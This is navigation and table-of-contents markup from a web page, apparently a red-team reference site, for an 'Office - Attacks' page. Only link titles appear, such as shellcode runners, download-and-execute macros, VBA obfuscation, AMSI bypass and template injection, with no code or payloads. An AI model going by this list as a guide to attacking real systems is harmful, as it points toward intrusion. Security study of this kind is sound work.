      <a href="../../../cheatsheets/shell-bind-cheatsheet/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Bind Shell
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cheatsheets/shell-reverse-cheatsheet/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Reverse Shell Cheat Sheet
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cheatsheets/source-code-management-ci/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Source Code Management & CI/CD Compromise
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
        
          
          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Cloud
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_4">
            <span class="md-nav__icon md-icon"></span>
            Cloud
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_1" >
        
          
          <label class="md-nav__link" for="__nav_4_1" id="__nav_4_1_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Aws
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_4_1">
            <span class="md-nav__icon md-icon"></span>
            Aws
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cloud/aws/AWS%20Pentest/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Cloud - AWS
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cloud/aws/aws-access-token/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    AWS - Access Token & Secrets
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cloud/aws/aws-cognito/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    AWS - Service - Cognito
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cloud/aws/aws-dynamodb/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    AWS - Service - DynamoDB
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cloud/aws/aws-ec2/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    AWS - Service - EC2
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cloud/aws/aws-enumeration/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    AWS - Enumerate
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cloud/aws/aws-iam/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    AWS - Identity & Access Management
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cloud/aws/aws-ioc-detection/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    AWS - IOC & Detections
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cloud/aws/aws-lambda/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    AWS - Service - Lambda
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cloud/aws/aws-metadata/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    AWS - Metadata SSRF
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cloud/aws/aws-s3-bucket/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    AWS - Service - S3 Buckets
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cloud/aws/aws-ssm/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    AWS - Service - SSM
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cloud/aws/aws-training/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    AWS - Training
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_2" >
        
          
          <label class="md-nav__link" for="__nav_4_2" id="__nav_4_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Azure
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_4_2">
            <span class="md-nav__icon md-icon"></span>
            Azure
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cloud/azure/azure-access-and-token/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Azure AD Tokens
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cloud/azure/azure-ad-connect/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Azure AD Connect
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cloud/azure/azure-devices-users-sp/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Azure AD IAM
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cloud/azure/azure-enumeration/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Azure AD Enumerate
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cloud/azure/azure-persistence/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Azure Persistence
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cloud/azure/azure-phishing/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Azure AD Phishing
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cloud/azure/azure-requirements/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Azure Requirements
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cloud/azure/azure-services-application-endpoint/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Azure Services - Application Endpoint
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cloud/azure/azure-services-application-proxy/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Azure Services - Application Proxy
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cloud/azure/azure-services-container-registry/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Azure Services - Container Registry
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cloud/azure/azure-services-deployment-template/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Azure Services - Deployment Template
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cloud/azure/azure-services-devops/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Azure Services - Azure DevOps
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cloud/azure/azure-services-keyvault/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Azure Services - KeyVault
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cloud/azure/azure-services-microsoft-intune/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Azure Services - Microsoft Intune
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cloud/azure/azure-services-office-365/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Azure Services - Office 365
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cloud/azure/azure-services-runbook/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Azure Services - Runbook and Automation
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cloud/azure/azure-services-storage-blob/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Azure Services - Storage Blob
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cloud/azure/azure-services-virtual-machine/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Azure Services - Virtual Machine
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cloud/azure/azure-services-web-apps/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Azure Services - Web Apps
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
        
          
          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Command control
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_5">
            <span class="md-nav__icon md-icon"></span>
            Command control
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../command-control/cobalt-strike/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Cobalt Strike
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../command-control/metasploit/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Metasploit
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" >
        
          
          <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Containers
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_6">
            <span class="md-nav__icon md-icon"></span>
            Containers
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../containers/docker/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Docker
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../containers/kubernetes/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Kubernetes
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" >
        
          
          <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Methodology
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_7">
            <span class="md-nav__icon md-icon"></span>
            Methodology
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../methodology/bug-hunting-methodology/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Bug Hunting Methodology
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../methodology/vulnerability-reports/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Vulnerability Reports
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
    
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8" checked>
        
          
          <label class="md-nav__link" for="__nav_8" id="__nav_8_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Redteam
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_8_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_8">
            <span class="md-nav__icon md-icon"></span>
            Redteam
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
    
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8_1" checked>
        
          
          <label class="md-nav__link" for="__nav_8_1" id="__nav_8_1_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Access
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_8_1_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_8_1">
            <span class="md-nav__icon md-icon"></span>
            Access
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../attack-surface-enumeration/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Subdomains Enumeration
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../html-smuggling/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HTML Smuggling
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../initial-access/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Initial Access
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
    
  
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
        
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
  <span class="md-ellipsis">
    Office - Attacks
  </span>
  

          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        
  
  <span class="md-ellipsis">
    Office - Attacks
  </span>
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#summary" class="md-nav__link">
    <span class="md-ellipsis">
      Summary
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#office-products-features" class="md-nav__link">
    <span class="md-ellipsis">
      Office Products Features
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#office-default-passwords" class="md-nav__link">
    <span class="md-ellipsis">
      Office Default Passwords
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#office-macro-execute-winapi" class="md-nav__link">
    <span class="md-ellipsis">
      Office Macro execute WinAPI
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Office Macro execute WinAPI">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#description" class="md-nav__link">
    <span class="md-ellipsis">
      Description
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#example-with-a-simple-shellcode-runner" class="md-nav__link">
    <span class="md-ellipsis">
      Example with a simple Shellcode Runner
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#excel" class="md-nav__link">
    <span class="md-ellipsis">
      Excel
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Excel">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#xlsm-hot-manchego" class="md-nav__link">
    <span class="md-ellipsis">
      XLSM - Hot Manchego
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#xlm-macrome" class="md-nav__link">
    <span class="md-ellipsis">
      XLM - Macrome
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#xlm-excel-40-sharpshooter" class="md-nav__link">
    <span class="md-ellipsis">
      XLM Excel 4.0 - SharpShooter
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#xlm-excel-40-excelntdonut" class="md-nav__link">
    <span class="md-ellipsis">
      XLM Excel 4.0 - EXCELntDonut
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#xlm-excel-40-exec" class="md-nav__link">
    <span class="md-ellipsis">
      XLM Excel 4.0 - EXEC
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#slk-exec" class="md-nav__link">
    <span class="md-ellipsis">
      SLK - EXEC
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#word" class="md-nav__link">
    <span class="md-ellipsis">
      Word
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Word">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#docm-metasploit" class="md-nav__link">
    <span class="md-ellipsis">
      DOCM - Metasploit
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#docm-download-and-execute" class="md-nav__link">
    <span class="md-ellipsis">
      DOCM - Download and Execute
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#docm-macro-creator" class="md-nav__link">
    <span class="md-ellipsis">
      DOCM - Macro Creator
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#docm-c-converted-to-office-vba-macro" class="md-nav__link">
    <span class="md-ellipsis">
      DOCM - C# converted to Office VBA macro
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#docm-vba-wscript" class="md-nav__link">
    <span class="md-ellipsis">
      DOCM - VBA Wscript
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#docm-vba-shell-execute-comment" class="md-nav__link">
    <span class="md-ellipsis">
      DOCM - VBA Shell Execute Comment
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#docm-vba-spawning-via-svchostexe-using-scheduled-task" class="md-nav__link">
    <span class="md-ellipsis">
      DOCM - VBA Spawning via svchost.exe using Scheduled Task
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#docm-wmi-com-functions" class="md-nav__link">
    <span class="md-ellipsis">
      DOCM - WMI COM functions
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#docmxlm-macro-pack-macro-and-dde" class="md-nav__link">
    <span class="md-ellipsis">
      DOCM/XLM - Macro Pack - Macro and DDE
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#docm-badassmacros" class="md-nav__link">
    <span class="md-ellipsis">
      DOCM - BadAssMacros
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#docm-cactustorch-vba-module" class="md-nav__link">
    <span class="md-ellipsis">
      DOCM - CACTUSTORCH VBA Module
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#docm-mmg-with-custom-dl-exec" class="md-nav__link">
    <span class="md-ellipsis">
      DOCM - MMG with Custom DL + Exec
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#docm-activex-based-inkpicture-control-painted-event-autorun-macro" class="md-nav__link">
    <span class="md-ellipsis">
      DOCM - ActiveX-based (InkPicture control, Painted event) Autorun macro
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#vba-obfuscation" class="md-nav__link">
    <span class="md-ellipsis">
      VBA Obfuscation
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#vba-purging" class="md-nav__link">
    <span class="md-ellipsis">
      VBA Purging
    </span>
  </a>
  
    <nav class="md-nav" aria-label="VBA Purging">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#officepurge" class="md-nav__link">
    <span class="md-ellipsis">
      OfficePurge
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#evilclippy" class="md-nav__link">
    <span class="md-ellipsis">
      EvilClippy
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#vba-offensive-security-template" class="md-nav__link">
    <span class="md-ellipsis">
      VBA - Offensive Security Template
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#vba-amsi" class="md-nav__link">
    <span class="md-ellipsis">
      VBA - AMSI
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#docx-template-injection" class="md-nav__link">
    <span class="md-ellipsis">
      DOCX - Template Injection
    </span>
  </a>
  
    <nav class="md-nav" aria-label="DOCX - Template Injection">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#remote-template" class="md-nav__link">
    <span class="md-ellipsis">
      Remote Template
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#template-injections-tools" class="md-nav__link">
    <span class="md-ellipsis">
      Template Injections Tools
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#docx-dde" class="md-nav__link">
    <span class="md-ellipsis">
      DOCX - DDE
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#references" class="md-nav__link">
    <span class="md-ellipsis">
      References
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../windows-download-execute/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Windows - Download and execute methods
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../windows-using-credentials/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Windows - Using credentials
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8_2" >
        
          
          <label class="md-nav__link" for="__nav_8_2" id="__nav_8_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Escalation
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_8_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_8_2">
            <span class="md-nav__icon md-icon"></span>
            Escalation
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../escalation/linux-privilege-escalation/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Linux - Privilege Escalation
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../escalation/windows-privilege-escalation/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Windows - Privilege Escalation
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8_3" >
        
          
          <label class="md-nav__link" for="__nav_8_3" id="__nav_8_3_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Evasion
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_8_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_8_3">
            <span class="md-nav__icon md-icon"></span>
            Evasion
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../evasion/linux-evasion/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Linux - Evasion
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../evasion/windows-amsi-bypass/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Windows - AMSI Bypass
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../evasion/windows-defenses/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Windows - Defenses
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../evasion/windows-dpapi/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Windows - DPAPI
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8_4" >
        
          
          <label class="md-nav__link" for="__nav_8_4" id="__nav_8_4_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Persistence
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_8_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_8_4">
            <span class="md-nav__icon md-icon"></span>
            Persistence
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../persistence/linux-persistence/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Linux - Persistence
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../persistence/windows-persistence/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Windows - Persistence
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8_5" >
        
          
          <label class="md-nav__link" for="__nav_8_5" id="__nav_8_5_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Pivoting
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_8_5_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_8_5">
            <span class="md-nav__icon md-icon"></span>
            Pivoting
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../pivoting/network-pivoting-techniques/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Network Pivoting Techniques
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#summary" class="md-nav__link">
    <span class="md-ellipsis">
      Summary
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#office-products-features" class="md-nav__link">
    <span class="md-ellipsis">
      Office Products Features
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#office-default-passwords" class="md-nav__link">
    <span class="md-ellipsis">
      Office Default Passwords
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#office-macro-execute-winapi" class="md-nav__link">
    <span class="md-ellipsis">
      Office Macro execute WinAPI
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Office Macro execute WinAPI">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#description" class="md-nav__link">
    <span class="md-ellipsis">
      Description
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#example-with-a-simple-shellcode-runner" class="md-nav__link">
    <span class="md-ellipsis">
      Example with a simple Shellcode Runner
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#excel" class="md-nav__link">
    <span class="md-ellipsis">
      Excel
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Excel">
      <ul class="md-nav__list">
